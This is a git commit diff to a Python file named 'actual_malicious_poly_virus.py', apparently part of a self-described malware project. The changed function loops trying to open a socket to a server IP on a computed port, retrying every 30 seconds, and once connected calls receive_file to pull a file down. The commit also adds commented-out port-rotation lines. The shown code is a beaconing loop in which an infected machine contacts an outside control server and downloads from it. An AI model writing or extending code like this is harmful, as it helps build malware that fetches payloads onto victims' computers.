7f836a74a696d81dcb90938308707843713cdac5
HRISHIKESH BHAT <83940584+Hrishi34@users.noreply.github.com>
2023-08-10 15:19:43 +0530

    Update actual_malicious_poly_virus.py

--- actual_malicious_poly_virus.py
+++ actual_malicious_poly_virus.py
@@ -96,16 +96,21 @@ def connect_to_server(port):
         #     port=1025 
 
         # print(f"before connection {port}")
+
         while True:
             try:
                 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 client.settimeout(3)  # Set a timeout for the connection attempt
+                # port =(current_time % 6)* 1025
+                # if port==0:
+                #     port=1025 
                 client.connect((server_ip, port))
                 print(f"Connected to server at port {port}")
                 # client.close()
                 break
             except Exception as e :
                 print(f"No server exists at port {port} error is: {e}")
+                time.sleep(30)
         
         print(f"before calling receivefile with port {port}")
         receive_file(client, port)
